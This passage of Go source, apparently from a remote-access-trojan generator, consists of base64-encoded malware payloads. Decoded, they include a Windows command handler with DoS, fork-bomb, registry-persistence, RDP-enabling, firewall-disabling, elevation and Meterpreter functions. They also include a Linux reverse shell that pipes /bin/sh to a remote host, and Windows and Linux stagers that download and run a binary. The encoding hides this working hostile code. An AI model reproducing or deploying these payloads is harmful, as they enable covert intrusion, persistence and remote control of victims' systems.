gICAgICBNRVRFUlBSRVRFUl9DUkVBVEUoKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo0RPUyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo2RvcyIpIHsKICAgICAgRE9TX0NvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHbG9iYWxfX0NvbW1hbmQsICJcIiIpCiAgICAgIERPU19UYXJnZXQgPSAgRE9TX0NvbW1hbmRbMV0KICAgICAgZ28gRE9TKCk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNESVNUUkFDVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo2Rpc3RyYWN0IikgewogICAgICBESVNUUkFDVCgpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjREVTS1RPUCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICLCo2Rlc2t0b3AiKSB7CiAgICAgIFN0YXR1cyA6PSBSRU1PVEVfREVTS1RPUCgpCiAgICAgIGlmIFN0YXR1cyA9PSBmYWxzZSB7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlstXSBmYWlsZWQgwqM+IikpCiAgICAgIH1lbHNlewogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJbK10gc3VjY2VzcyDCoz4iKSkKICAgICAgfQogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIsKjUEVSU0lTVEVOQ0UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNwZXJzaXN0ZW5jZSIpIHsKICAgICAgZ28gUEVSU0lTVCgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoIlxuXG5bKl0gQWRkaW5nIHBlcnNpc3RlbmNlIHJlZ2lzdHJpZXMuLi5cblsqXSBQZXJzaXN0ZW5jZSBDb21wbGV0ZWRcblxuIMKjPiAiKSkpOwogICAgfWVsc2V7CiAgICAgIGNtZCA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIF9Db21tYW5kKTsKICAgICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICAgIG91dCwgXyA6PSBjbWQuT3V0cHV0KCk7CiAgICAgIENvbW1hbmRfT3V0cHV0IDo9IHN0cmluZyhzdHJpbmcob3V0KSsiIMKjPiAiKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoQ29tbWFuZF9PdXRwdXQpKTsKICAgIH07CiAgfTsKfTsKCgoKCmZ1bmMgVVBMT0FEX1ZJQV9HRVQoKSB7CiAgZm9yIHsKICAgIGRvd25sb2FkX3VybCA6PSBzdHJpbmdzLlNwbGl0KEdsb2JhbF9fQ29tbWFuZCwgIlwiIik7CiAgICByZXNwb25zZSwgZXJyIDo9IGh0dHAuR2V0KGRvd25sb2FkX3VybFsxXSk7CiAgICBpZiBlcnIgIT0gbmlsIHsKICAgICAgZmlsZV90cmFuc2Zlcl9zdWNjZXMgPSBmYWxzZTsKICAgICAgYnJlYWs7CiAgICB9OwogICAgZGVmZXIgcmVzcG9uc2UuQm9keS5DbG9zZSgpOwogICAgYm9keSwgXyA6PSBpb3V0aWwuUmVhZEFsbChyZXNwb25zZS5Cb2R5KTsKICAgIGZpbGUsIF8gOj0gb3MuQ3JlYXRlKCJ3aW5kbGxfdXBsb2FkLmV4ZSIpOwogICAgZmlsZS5Xcml0ZVN0cmluZyhzdHJpbmcoYm9keSkpOwogICAgZmlsZV90cmFuc2Zlcl9zdWNjZXMgPSB0cnVlOwogICAgcnVudGltZS5HQygpOwogICAgY3VzdG9tX2NvbW1hbmQgOj0gKCJtb3ZlIHdpbmRsbF91cGxvYWQuZXhlICIrIiUiKyJhcHBkYXRhIisiJSIpOwogICAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgY3VzdG9tX2NvbW1hbmQpOwogICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICBjbWQuUnVuKCk7CiAgICBicmVhazsKICB9Owp9OwoKCgpmdW5jIFBFUlNJU1QoKSB7CgogIFBFUlNJU1QsIF8gOj0gb3MuQ3JlYXRlKCJQRVJTSVNULmJhdCIpCgogIFBFUlNJU1QuV3JpdGVTdHJpbmcoIm1rZGlyICVBUFBEQVRBJVxcV2luZG93cyIrIlxuIikKICBQRVJTSVNULldyaXRlU3RyaW5nKCJjb3B5ICIgKyBvcy5BcmdzWzBdICsgIiAlQVBQREFUQSVcXFdpbmRvd3NcXHdpbmRsbC5leGVcbiIpCiAgUEVSU0lTVC5Xcml0ZVN0cmluZygiUkVHIEFERCBIS0NVXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuIC9WIFdpbkRsbCAvdCBSRUdfU1ogL0YgL0QgJUFQUERBVEElXFxXaW5kb3dzXFx3aW5kbGwuZXhlIikKCiAgUEVSU0lTVC5DbG9zZSgpCgogIEV4ZWMgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAiUEVSU0lTVC5iYXQiKTsKICBFeGVjLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgRXhlYy5SdW4oKTsKICBDbGVhbiA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJkZWwgUEVSU0lTVC5iYXQiKTsKICBDbGVhbi5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIENsZWFuLlJ1bigpOwp9OwoKCmZ1bmMgTUVURVJQUkVURVJfQ1JFQVRFKCkgewogIGlmIHN0cmluZ3MuQ29udGFpbnMoR2xvYmFsX19Db21tYW5kLCAiLWMiKSB7CiAgICBQQVlMT0FELCBfIDo9IG9zLkNyZWF0ZSgid2luZGxsLmJhdCIpCiAgICBQQVlMT0FEX0NPREUgOj0gc3RyaW5ncy5TcGxpdChHbG9iYWxfX0NvbW1hbmQsICItYyIpCiAgICBQQVlMT0FELldyaXRlU3RyaW5nKHN0cmluZyhQQVlMT0FEX0NPREVbMV0pKQogICAgcnVudGltZS5HQygpCiAgICBjdXN0b21fY29tbWFuZCA6PSAoIm1vdmUgd2luZGxsLmJhdCAiICsgIiUiICsgImFwcGRhdGEiKyIlIik7CiAgICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBjdXN0b21fY29tbWFuZCk7CiAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgIGNtZC5SdW4oKTsKICAgIHJ1bnRpbWUuR0MoKTsKICAgIGN1c3RvbV9jb21tYW5kID0gKCIlIisiYXBwZGF0YSIrIiUiKyIvd2luZGxsLmJhdCIpOwogICAgY21kID0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBjdXN0b21fY29tbWFuZCk7CiAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgIGNtZC5SdW4oKTsKICAgIGNtZCA9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIndpbmRsbC5iYXQiKTsKICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgY21kLlJ1bigpOwogIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoR2xvYmFsX19Db21tYW5kLCAiLUMiKSB7CiAgICBQQVlMT0FELCBfIDo9IG9zLkNyZWF0ZSgid2luZGxsLmJhdCIpCiAgICBQQVlMT0FEX0NPREUgOj0gc3RyaW5ncy5TcGxpdChHbG9iYWxfX0NvbW1hbmQsICItQyIpCiAgICBQQVlMT0FELldyaXRlU3RyaW5nKHN0cmluZyhQQVlMT0FEX0NPREVbMV0pKQogICAgcnVudGltZS5HQygpCiAgICBjdXN0b21fY29tbWFuZCA6PSAoIm1vdmUgd2luZGxsLmJhdCAiICsgIiUiICsgImFwcGRhdGEiKyIlIik7CiAgICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBjdXN0b21fY29tbWFuZCk7CiAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgIGNtZC5SdW4oKTsKICAgIHJ1bnRpbWUuR0MoKTsKICAgIGN1c3RvbV9jb21tYW5kID0gKCIlIisiYXBwZGF0YSIrIiUiKyIvd2luZGxsLmJhdCIpOwogICAgY21kID0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBjdXN0b21fY29tbWFuZCk7CiAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgIGNtZC5SdW4oKTsKICAgIGNtZCA9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIndpbmRsbC5iYXQiKTsKICAgIGNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogICAgY21kLlJ1bigpOwogIH0KfQoKCmZ1bmMgRE9XTkxPQURfVklBX1RDUCgpIHsKICBmb3IgewogICAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBWSUNUSU1fSVArIjoiKyI1NTg4OCIpOwogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgIFVQTE9BRF9WSUFfVENQKCk7CiAgICB9OwogICAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR2xvYmFsX19Db21tYW5kLCAiXCIiKTsKICAgIGZpbGUsIF8gOj0gb3MuT3BlbihmaWxlX25hbWVbMV0pOwogICAgZGVmZXIgZmlsZS5DbG9zZSgpOwogICAgaW8uQ29weShjb25uZWN0LCBmaWxlKTsKICAgIGNvbm5lY3QuQ2xvc2UoKTsKICAgIGJyZWFrOwogIH07Cn07CgoKZnVuYyBVUExPQURfVklBX1RDUCgpIHsKICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIFZJQ1RJTV9JUCsiOiIrIjU1ODg4Iik7CiAgaWYgZXJyICE9IG5pbCB7CiAgICBVUExPQURfVklBX1RDUCgpOwogIH07CiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR2xvYmFsX19Db21tYW5kLCAiXCIiKTsKICBmaWxlLCBfIDo9IG9zLkNyZWF0ZShmaWxlX25hbWVbMV0pOwogIGZpbGVfbmFtZVsxXSA9IHN0cmluZ3MuVHJpbShmaWxlX25hbWVbMV0sICIgIik7CiAgZGVmZXIgZmlsZS5DbG9zZSgpOwogIGlvLkNvcHkoZmlsZSwgY29ubmVjdCk7CiAgZmlsZS5DbG9zZSgpOwogIGNvbm5lY3QuQ2xvc2UoKTsKfTsKCgpmdW5jIFNBWV9QTEVBU0UoKSAoc3RyaW5nKXsKICBDb21tYW5kIDo9IHN0cmluZ3MuU3BsaXQoR2xvYmFsX19Db21tYW5kLCAiXCIiKTsKICBjbWQgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBzdHJpbmcoInBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIFN0YXJ0LVByb2Nlc3MgLVZlcmIgUnVuQXMgIitzdHJpbmcoQ29tbWFuZFsxXSkpKTsKICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBvdXQsIF8gOj0gY21kLk91dHB1dCgpOwogIENvbW1hbmRfT3V0cHV0IDo9IHN0cmluZyhzdHJpbmcob3V0KSsiIMKjPiAiKTsKICByZXR1cm4gQ29tbWFuZF9PdXRwdXQ7Cn07CgoKCmZ1bmMgUkVNT1RFX0RFU0tUT1AoKSAoYm9vbCkgewoKICB2YXIgU3RhdHVzIGJvb2wgPSB0cnVlOwogIEVuYWJsZV9SRCA6PSAicmVnIGFkZCBcImhrbG1cXHN5c3RlbVxcY3VycmVudENvbnRyb2xTZXRcXENvbnRyb2xcXFRlcm1pbmFsIFNlcnZlclwiIC92IFwiQWxsb3dUU0Nvbm5lY3Rpb25zXCIgL3QgUkVHX0RXT1JEIC9kIDB4MSAvZiI7CiAgRW5hYmxlX1JEXzIgOj0gInJlZyBhZGQgXCJoa2xtXFxzeXN0ZW1cXGN1cnJlbnRDb250cm9sU2V0XFxDb250cm9sXFxUZXJtaW5hbCBTZXJ2ZXJcIiAvdiBcImZEZW55VFNDb25uZWN0aW9uc1wiIC90IFJFR19EV09SRCAvZCAweDAgL2YiOwogIHJ1bnRpbWUuR0MoKTsKICBFX1JEIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKEVuYWJsZV9SRCkpOwogIEVfUkQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBFX1JELlJ1bigpOwogIHJ1bnRpbWUuR0MoKTsKICBFX1JEXzIgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBzdHJpbmcoRW5hYmxlX1JEXzIpKTsKICBFX1JEXzIuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBFX1JEXzIuUnVuKCk7CiAgcnVudGltZS5HQygpOwogIFN0YXJ0X1Rlcm1TZXJ2aWNlXzEgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAic2MgY29uZmlnIFRlcm1TZXJ2aWNlIHN0YXJ0PSBhdXRvIik7CiAgU3RhcnRfVGVybVNlcnZpY2VfMS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIFNlcnZpY2VfT3V0cHV0XzEsIF8gOj0gU3RhcnRfVGVybVNlcnZpY2VfMS5PdXRwdXQoKTsKICBpZiBzdHJpbmdzLkNvbnRhaW5zKHN0cmluZyhTZXJ2aWNlX091dHB1dF8xKSwgImRlbmllZC4iKSB7CiAgICBTdGF0dXMgPSBmYWxzZQogIH0KICBydW50aW1lLkdDKCk7CiAgU3RhcnRfVGVybVNlcnZpY2VfMiA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJuZXQgc3RhcnQgVGVybXNlcnZpY2UiKTsKICBTdGFydF9UZXJtU2VydmljZV8yLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgU3RhcnRfVGVybVNlcnZpY2VfMi5SdW4oKTsKICBydW50aW1lLkdDKCk7CiAgRGlzYWJsZV9GVyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJuZXRzaCBmaXJld2FsbCBzZXQgb3Btb2RlIGRpc2FibGUiKTsKICBEaXNhYmxlX0ZXLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgRldfT3V0cHV0LCBfIDo9IERpc2FibGVfRlcuT3V0cHV0KCk7CiAgcnVudGltZS5HQygpOwogIGlmIHN0cmluZ3MuQ29udGFpbnMoc3RyaW5nKEZXX091dHB1dCksICIoUnVuIGFzIGFkbWluaXN0cmF0b3IpLiIpewogICAgU3RhdHVzID0gZmFsc2UKICB9CiAgcmV0dXJuIFN0YXR1cwp9CgoKCmZ1bmMgRElTVFJBQ1QoKSB7CiAgdmFyIEZvcmtfQm9tYiBzdHJpbmcgPSAiOkFcbnN0YXJ0XG5nb3RvIEEiCgogIEZfQm9tYiwgXyA6PSBvcy5DcmVhdGUoIkZfQm9tYi5iYXQiKQoKICBGX0JvbWIuV3JpdGVTdHJpbmcoRm9ya19Cb21iKQoKICBGX0JvbWIuQ2xvc2UoKQoKICBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJGX0JvbWIuYmF0IikuU3RhcnQoKQoKfQoKCmZ1bmMgRE9TKCkgewogIGZvciB7CiAgICBET1NfUmVxdWVzdF9Db3VudGVyKysKICAgIHJlc3BvbnNlLCBfIDo9IGh0dHAuR2V0KERPU19UYXJnZXQpOwoKICAgIGJvZHksIF8gOj0gaW91dGlsLlJlYWRBbGwocmVzcG9uc2UuQm9keSk7CiAgICBmbXQuUHJpbnRsbihib2R5KQogICAgcmVzcG9uc2UuQm9keS5DbG9zZSgpOwogICAgaWYgRE9TX1JlcXVlc3RfQ291bnRlciA8IERPU19SZXF1ZXN0X0xpbWl0IHsKICAgICAgZ28gRE9TKCkKICAgIH1lbHNlewogICAgICBicmVhazsKICAgIH0KICB9Cn0KCgpmdW5jIERJU1BBVENIKCkgewogIHZhciBFbmNvZGVkQmluYXJ5IHN0cmluZyA9ICIvL0lOU0VSVC1CSU5BUlktSEVSRS8vIgoKCiAgQmluYXJ5LCBfIDo9IG9zLkNyZWF0ZSgid2ludXBkdC5leGUiKQoKICBEZWNvZGVkQmluYXJ5LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoRW5jb2RlZEJpbmFyeSkKCiAgQmluYXJ5LldyaXRlU3RyaW5nKHN0cmluZyhEZWNvZGVkQmluYXJ5KSk7CgogIEJpbmFyeS5DbG9zZSgpCgogIEV4ZWMgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAid2ludXBkdC5leGUiKTsKICBFeGVjLlN0YXJ0KCk7Cn0K"

var LINUX_PAYLOAD string = "CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyhkaXIpICsgIiDCoz4gIiArIHN0cmluZyh2ZXJzaW9uKSArICIgwqM+ICIpOyAgIAogICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpCiAgICBjbWQ6PWV4ZWMuQ29tbWFuZCgiL2Jpbi9zaCIpOwogICAgY21kLlN0ZGluPWNvbm5lY3Q7CiAgICBjbWQuU3Rkb3V0PWNvbm5lY3Q7CiAgICBjbWQuU3RkZXJyPWNvbm5lY3Q7CiAgICBjbWQuUnVuKCk7Cn0="


var WIN_STAGER_PAYLOAD string = "CgpwYWNrYWdlIG1haW4KCgppbXBvcnQgIm9zIgppbXBvcnQgIm5ldCIKaW1wb3J0ICJ0aW1lIgppbXBvcnQgImlvIgppbXBvcnQgIm9zL2V4ZWMiCmltcG9ydCAicnVudGltZSIKaW1wb3J0ICJzeXNjYWxsIgoKY29uc3QgVklDVElNX0lQID0gIjEyNy4wLjAuMSI7CmNvbnN0IFZJQ1RJTV9QT1JUID0gIjg1NTIiOwoKZnVuYyBtYWluKCkgewogIAogIENvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgVklDVElNX0lQKyI6IitWSUNUSU1fUE9SVCk7CiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgdGltZS5TbGVlcCg1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBtYWluKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgfTsKICBmaWxlLCBfIDo9IG9zLkNyZWF0ZSgid2luZGxsLmV4ZSIpOwogIGlvLkNvcHkoZmlsZSwgQ29ubmVjdCk7CiAgcnVudGltZS5HQygpCiAgTW92ZV9TdHJpbmcgOj0gc3RyaW5nKCJtb3ZlIHdpbmRsbC5leGUgIisiJSIrImFwcGRhdGEiKyIlIikKICBNb3ZlIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgTW92ZV9TdHJpbmcpOwogIE1vdmUuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBNb3ZlLlJ1bigpCiAgRXhlY3V0ZV9TdHJpbmcgOj0gc3RyaW5nKCIlIisiYXBwZGF0YSIrIiUiKyJcXHdpbmRsbC5leGUiKQogIEV4ZWN1dGUgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBFeGVjdXRlX1N0cmluZyk7CiAgRXhlY3V0ZS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEV4ZWN1dGUuUnVuKCkKfQ=="


var LINUX_STAGER_PAYLOAD string = "CgpwYWNrYWdlIG1haW4KCgppbXBvcnQgIm9zIgppbXBvcnQgIm5ldCIKaW1wb3J0ICJ0aW1lIgppbXBvcnQgImlvIgppbXBvcnQgIm9zL2V4ZWMiCmltcG9ydCAicnVudGltZSIKaW1wb3J0ICJzeXNjYWxsIgoKY29uc3QgVklDVElNX0lQID0gIjEyNy4wLjAuMSI7CmNvbnN0IFZJQ1RJTV9QT1JUID0gIjg1NTIiOwoKZnVuYyBtYWluKCkgewogIAogIENvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgVklDVElNX0lQKyI6IitWSUNUSU1fUE9SVCk7CiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgdGltZS5TbGVlcCg1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBtYWluKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgfTsKICBmaWxlLCBfIDo9IG9zLkNyZWF0ZSgibGludXhsaWIiKTsKICBpby5Db3B5KGZpbGUsIENvbm5lY3QpOwogIHJ1bnRpbWUuR0MoKQogIGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAiY2htb2QgNzc3IGxpbnV4bGliIikKICBFeGVjdXRlIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgLi9saW51eGxpYik7CiAgRXhlY3V0ZS5SdW4oKQp9"
